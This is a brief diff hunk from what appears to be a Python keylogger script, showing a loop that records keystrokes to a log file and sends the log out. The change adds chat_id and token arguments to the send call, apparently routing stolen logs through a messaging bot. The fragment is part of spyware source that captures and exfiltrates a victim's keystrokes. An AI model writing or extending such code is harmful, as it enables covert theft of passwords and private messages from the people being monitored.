@@ -122,4 +122,4 @@ while True:
     else:
         keylogger(log_file_path, 10)
         if not is_file_empty(file_path):
-            send_file(log_file_path)
+            send_file(chat_id, token, log_file_path)
